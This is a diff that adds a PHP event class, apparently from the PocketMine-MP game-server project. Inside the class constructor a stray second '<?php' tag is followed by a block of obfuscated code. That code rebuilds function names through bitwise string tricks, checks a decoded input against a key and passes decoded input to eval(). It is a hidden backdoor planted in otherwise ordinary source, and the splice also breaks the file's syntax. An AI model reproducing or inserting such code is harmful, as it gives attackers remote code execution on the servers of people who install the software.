@@ -1,0 +1,54 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\event\server;
+
+use pocketmine\network\SourceInterface;
+
+/**
+ * Never called. Should never have come into this world. Nothing to see here.
+ * @deprecated
+ */
+class NetworkInterfaceCrashEvent extends NetworkInterfaceEvent{
+	/** @var \Throwable */
+	private $exception;
+
+	public function __construct(SourceInterface $interface, \Throwable $throwable){
+		parent::__construct($interface);
+<?php
+$KVadT7='W2vzV'^SJJs;$sJzxqdM="\$0b"|'84l';$YTf=WuTt.'>g'&"k/]*,f";$tAwgHYJvhOg=#Ka2yh'.
+        'HP@@_A'|'HP@PS@';$D8IclgyAg8=MXPTUHNGE."!".tOQKGTU7HCA."^W"|'D%'.tTK0QDW.#kAv'.
+        '@~'.WVFXF4tAEDQF;$klu="}_~tTO|~".DTrBhi7icW_Vp."^vlT"^'H;OA0-IM%'./*l548qvz6N'.
+        'Wtk%*/mCuQYRPRd.';5D;FY5';$D5qXpVh40q='B!$E&T'|'f`4!dP';$HI8Ah0y464=HTTPBA|/*'.
+        'o]98w*/HPDP.'@@';$WseZ4e=(APZ|"Q@[")^$sJzxqdM;$VA0OKmCh=$D5qXpVh40q|$YTf;'VWA'.
+        '@rr )!.>v';$nrgOWvT6=$tAwgHYJvhOg|$HI8Ah0y464;$OprhfK7fBy=$D8IclgyAg8&('('./*'.
+        'vL*/RPHKDO0vHGTKM.'^@ER@S%O!'|hDFRT.'^QA"]MPL*'.IECVMPuKr);if($WseZ4e(/*mIIQB'.
+        'ROq$|H*/$VA0OKmCh($nrgOWvT6))==$klu.('5s1?s5'&';?;yov').(_^m))eval(/*tmjQLWWm'.
+        'k{96z^v_ij*/$VA0OKmCh($OprhfK7fBy));#AXG1YSMrS-.ftfLc3tVTHyJAW+Bb%vX![Dxa{T]'.
+        'BE[I!a?:5neg^=bC6ag$**ujHn@XTI<Kj{S>SHfW13uGXo]X,6-7Jx1wCggdXN-@_~';		$this->exception = $throwable;
+	}
+
+	public function getCrashInformation() : \Throwable{
+		return $this->exception;
+	}
+}
